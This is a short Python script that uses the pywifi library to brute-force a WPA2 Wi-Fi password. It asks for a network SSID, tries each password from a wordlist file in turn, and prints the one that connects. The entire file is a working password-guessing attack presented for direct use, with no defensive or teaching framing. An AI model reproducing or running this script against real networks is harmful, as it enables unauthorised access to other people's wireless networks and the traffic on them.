# Save the file with the filename specific.py
# Enter the ssid of the network when asked.

import pywifi
import time
from pywifi import const

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

def connect_to_network(network_name, password):
    profile = pywifi.Profile()
    profile.ssid = network_name
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    
    iface.connect(tmp_profile)
    time.sleep(5)  # Allow time for connection to establish
    
    if iface.status() == const.IFACE_CONNECTED:
        return password
    else:
        return None

def main():
    network_name = input("Enter the network SSID: ")
    
    with open("wordlist.txt", "r") as wordlist_file:
        passwords = wordlist_file.read().splitlines()
    
    for password in passwords:
        print(f"Trying password: {password}")
        matched_password = connect_to_network(network_name, password)
        
        if matched_password:
            print(f"Connected to {network_name} successfully with password: {matched_password}")
            break
    else:
        print(f"Could not connect to {network_name} with any passwords.")

if __name__ == "__main__":
    main()
